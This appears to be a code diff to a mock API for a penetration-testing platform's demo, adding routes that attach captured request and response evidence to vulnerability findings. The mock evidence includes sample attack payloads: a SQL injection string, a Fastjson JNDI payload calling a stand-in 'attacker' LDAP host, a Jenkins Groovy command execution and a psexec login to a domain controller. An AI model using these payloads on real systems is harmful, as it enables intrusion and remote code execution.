@@ -16,8 +16,13 @@ import type {
   Company,
   CompanyScopeRule,
   Conversation,
+  EvidenceBodyPreview,
   FindingRetest,
+  FindingTraffic,
+  FindingTrafficBinding,
   IntentAsset,
+  TrafficEvidenceRole,
+  TrafficEvidenceSnapshot,
   ScopeRow,
   Task,
   TaskArchive,
@@ -45,6 +50,127 @@ const mockTaskCategories = structuredClone(D.taskCategories);
 const mockConversations = structuredClone(D.conversations);
 const mockRetests: FindingRetest[] = [];
 const mockRetestMessages: Record<number, Activity[]> = {};
+
+// ── 关联流量证据(finding traffic) ─────────────────────────────────────────────
+// 后端把请求/响应快照独立存到 evidence 表,前端详情页用 FindingTrafficPanel 展示。
+// demo 里为部分漏洞预置绑定,快照直接引用 mock 抓包(data.traffic.exchanges),
+// 其余漏洞返回空绑定。缺了这套路由,详情页会因读到空对象、访问 bindings.length 崩整页。
+const mockExchangeById = new Map((D.traffic.exchanges ?? []).map((exchange) => [exchange.id, exchange]));
+
+interface MockBindingSeed {
+  traffic_id: string;
+  role: TrafficEvidenceRole;
+  note?: string;
+}
+
+// 每条漏洞预置的流量证据(finding id → 绑定的抓包)。选取与漏洞语义对应的请求,
+// 让 demo 详情页的「关联流量」区块看起来真实。
+const mockFindingTrafficSeeds: Record<string, MockBindingSeed[]> = {
+  "f-1": [{ traffic_id: "x-2", role: "proof", note: "q 参数注入 payload，响应回显 MSSQL 报错。" }],
+  "f-2": [
+    { traffic_id: "x-8", role: "baseline", note: "本人订单 id=1001，作为正常对照。" },
+    { traffic_id: "x-9", role: "proof", note: "改 id=1002 越权读到他人订单。" },
+  ],
+  "f-12": [
+    { traffic_id: "x-15", role: "proof", note: "Fastjson @type JNDI payload，触发回连。" },
+    { traffic_id: "x-16", role: "verification", note: "二次请求确认命令执行落地。" },
+  ],
+  "f-15": [
+    { traffic_id: "x-17", role: "baseline", note: "Jenkins Script Console 未授权可达。" },
+    { traffic_id: "x-18", role: "proof", note: "scriptText 执行 Groovy 命令返回 SYSTEM。" },
+  ],
+  "f-17": [{ traffic_id: "x-19", role: "proof", note: "psexec 以 svc_deploy 登录域控 DC01。" }],
+};
+
+// demo 用固定报文正文,避免详情页 Request/Response 空白。
+const mockEvidenceBodies: Record<string, { req: string; resp: string }> = {
+  "x-2": {
+    req: "q=1' AND 1=CONVERT(int,@@version)--",
+    resp: '{"error":"Conversion failed when converting the nvarchar value \'Microsoft SQL Server 2019 ...\' to data type int."}',
+  },
+  "x-8": { req: "", resp: '{"order_id":1001,"user_id":42,"amount":199.00}' },
+  "x-9": {
+    req: "",
+    resp: '{"order_id":1002,"user_id":77,"amount":1299.00,"address":"北京市朝阳区 ****","phone":"138****6021"}',
+  },
+  "x-15": {
+    req: '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/Exploit","autoCommit":true}',
+    resp: '{"status":"error","message":"internal server error"}',
+  },
+  "x-16": { req: '{"cmd":"id"}', resp: '{"status":"ok","out":"uid=33(www-data) gid=33(www-data)"}' },
+  "x-17": { req: "", resp: "<html><title>Jenkins Script Console</title>..." },
+  "x-18": { req: "script=println 'whoami'.execute().text", resp: "nt authority\\system" },
+  "x-19": { req: "[psexec] acme/svc_deploy@10.10.10.10", resp: "[*] Got SYSTEM on DC01" },
+};
+
+// 运行期状态:finding id → 绑定列表(可增删改序,demo 内存态)。首次访问按种子初始化。
+const mockFindingTraffic: Record<string, FindingTrafficBinding[]> = {};
+const mockFindingTrafficVersion: Record<string, number> = {};
+let mockBindingSeq = 900;
+
+function mockBuildSnapshot(trafficId: string): TrafficEvidenceSnapshot {
+  const exchange = mockExchangeById.get(trafficId);
+  const capturedAt = exchange ? Math.floor(Date.parse(exchange.ts) / 1000) : 0;
+  let pathAndQuery = "/";
+  try {
+    if (exchange) pathAndQuery = new URL(exchange.url).pathname + new URL(exchange.url).search;
+  } catch {
+    // 保底用根路径。
+  }
+  const body = mockEvidenceBodies[trafficId];
+  return {
+    id: `snap-${trafficId}`,
+    source_traffic_id: trafficId,
+    captured_at: capturedAt,
+    url: exchange?.url ?? "",
+    method: exchange?.method ?? "GET",
+    status: exchange?.status ?? 0,
+    content_type: exchange?.content_type ?? "",
+    req_head: `${exchange?.method ?? "GET"} ${pathAndQuery} HTTP/1.1\nHost: ${exchange?.host ?? ""}`,
+    resp_head: `HTTP/1.1 ${exchange?.status ?? 0}\nContent-Type: ${exchange?.content_type ?? ""}`,
+    req_hash: `req-${trafficId}`,
+    resp_hash: `resp-${trafficId}`,
+    req_len: body ? new TextEncoder().encode(body.req).length : 0,
+    resp_len: exchange?.resp_len ?? (body ? new TextEncoder().encode(body.resp).length : 0),
+  };
+}
+
+function mockTrafficBindings(findingID: string): FindingTrafficBinding[] {
+  if (!mockFindingTraffic[findingID]) {
+    const seeds = mockFindingTrafficSeeds[findingID] ?? [];
+    mockFindingTraffic[findingID] = seeds.map((seed, index) => ({
+      id: String(++mockBindingSeq),
+      finding_id: findingID,
+      snapshot_id: `snap-${seed.traffic_id}`,
+      role: seed.role,
+      note: seed.note ?? "",
+      position: index,
+      created_at: new Date(Date.now() - (seeds.length - index) * 1000).toISOString(),
+      snapshot: mockBuildSnapshot(seed.traffic_id),
+    }));
+    mockFindingTrafficVersion[findingID] = 1;
+  }
+  return mockFindingTraffic[findingID];
+}
+
+function mockTrafficSummary(findingID: string): FindingTraffic {
+  const bindings = mockTrafficBindings(findingID).map((binding, index) => ({
+    ...binding,
+    position: index,
+    // 列表/摘要接口剥掉报文头,与后端 trafficSummary 一致。
+    snapshot: { ...binding.snapshot, req_head: "", resp_head: "" },
+  }));
+  const version = mockFindingTrafficVersion[findingID] ?? 1;
+  return { finding_id: findingID, version, report_version: version, bindings };
+}
+
+function mockTrafficCount(findingID: string): number {
+  return mockTrafficBindings(findingID).length;
+}
+
+function mockEvidencePreview(text: string): EvidenceBodyPreview {
+  return { content: text, offset: 0, total: text.length, next_offset: text.length, truncated: false, binary: false };
+}
 
 function advanceMockRetests() {
   for (const retest of mockRetests) {
@@ -1776,6 +1902,77 @@ function route(m: string, path: string, seg: string[], q: URLSearchParams, b: Re
       queued: false,
     };
   }
+  // 关联流量证据:列表 / 绑定 / 编辑 / 解绑 / 排序 / 单条报文详情(demo 内存态)。
+  // seg = ["exploration","findings",<id>,"traffic", ...]
+  if (seg[0] === "exploration" && seg[1] === "findings" && seg[3] === "traffic") {
+    const findingID = seg[2];
+    if (!mockFindings.some((item) => item.id === findingID)) throw new Error("漏洞不存在");
+    const bindings = mockTrafficBindings(findingID);
+    const bumpVersion = () => {
+      mockFindingTrafficVersion[findingID] = (mockFindingTrafficVersion[findingID] ?? 1) + 1;
+    };
+
+    // 单条报文详情:GET /traffic/{binding_id}
+    if (seg.length === 5 && seg[4] !== "order" && m === "GET") {
+      const binding = bindings.find((item) => item.id === seg[4]);
+      if (!binding) throw new Error("证据不存在");
+      const body = mockEvidenceBodies[binding.snapshot.source_traffic_id] ?? { req: "", resp: "" };
+      return {
+        binding: structuredClone(binding),
+        request: mockEvidencePreview(body.req),
+        response: mockEvidencePreview(body.resp),
+      };
+    }
+    // 报文正文分页:GET /traffic/{binding_id}/body —— demo 正文不截断,直接返回空续页。
+    if (seg.length === 6 && seg[5] === "body" && m === "GET") {
+      const binding = bindings.find((item) => item.id === seg[4]);
+      if (!binding) throw new Error("证据不存在");
+      const body = mockEvidenceBodies[binding.snapshot.source_traffic_id] ?? { req: "", resp: "" };
+      const side = q.get("side") === "request" ? body.req : body.resp;
+      return mockEvidencePreview(side);
+    }
+    // 绑定流量:POST /traffic
+    if (seg.length === 4 && m === "POST") {
+      const refs = Array.isArray(b.traffic_refs) ? (b.traffic_refs as MockBindingSeed[]) : [];
+      for (const ref of refs) {
+        if (!ref.traffic_id || bindings.some((item) => item.snapshot.source_traffic_id === ref.traffic_id)) continue;
+        bindings.push({
+          id: String(++mockBindingSeq),
+          finding_id: findingID,
+          snapshot_id: `snap-${ref.traffic_id}`,
+          role: ref.role ?? "supporting",
+          note: ref.note ?? "",
+          position: bindings.length,
+          created_at: new Date().toISOString(),
+          snapshot: mockBuildSnapshot(ref.traffic_id),
+        });
+      }
+      bumpVersion();
+      return mockTrafficSummary(findingID);
+    }
+    // 排序:PUT /traffic/order
+    if (seg.length === 5 && seg[4] === "order" && m === "PUT") {
+      const order = Array.isArray(b.binding_ids) ? (b.binding_ids as string[]) : [];
+      bindings.sort((left, right) => order.indexOf(left.id) - order.indexOf(right.id));
+      bumpVersion();
+      return mockTrafficSummary(findingID);
+    }
+    // 编辑说明 / 解绑:PATCH|DELETE /traffic/{binding_id}
+    if (seg.length === 5 && (m === "PATCH" || m === "DELETE")) {
+      const index = bindings.findIndex((item) => item.id === seg[4]);
+      if (index < 0) throw new Error("证据不存在");
+      if (m === "DELETE") {
+        bindings.splice(index, 1);
+      } else {
+        if (typeof b.role === "string") bindings[index].role = b.role as TrafficEvidenceRole;
+        if (typeof b.note === "string") bindings[index].note = b.note;
+      }
+      bumpVersion();
+      return mockTrafficSummary(findingID);
+    }
+    // 列表:GET /traffic
+    return mockTrafficSummary(findingID);
+  }
   // 单条 finding:GET 详情 / PATCH 改状态/严重度/名称/类别(demo 直接改内存对象)。
   if (seg[0] === "exploration" && seg[1] === "findings" && seg.length === 3 && seg[2] !== "stats") {
     const f = mockFindings.find((x) => x.id === seg[2]);
@@ -1797,6 +1994,7 @@ function route(m: string, path: string, seg: string[], q: URLSearchParams, b: Re
     return {
       ...f,
       finding_id: f.id,
+      traffic_count: mockTrafficCount(f.id),
       ...(inherited ? { inherited: true, source_task_id: f.task_id } : {}),
     };
   }
@@ -1807,6 +2005,7 @@ function route(m: string, path: string, seg: string[], q: URLSearchParams, b: Re
       ...f,
       report: undefined,
       finding_id: f.id,
+      traffic_count: mockTrafficCount(f.id),
     });
     if (task) {
       const owner = mockTasks.find((item) => item.id === task);
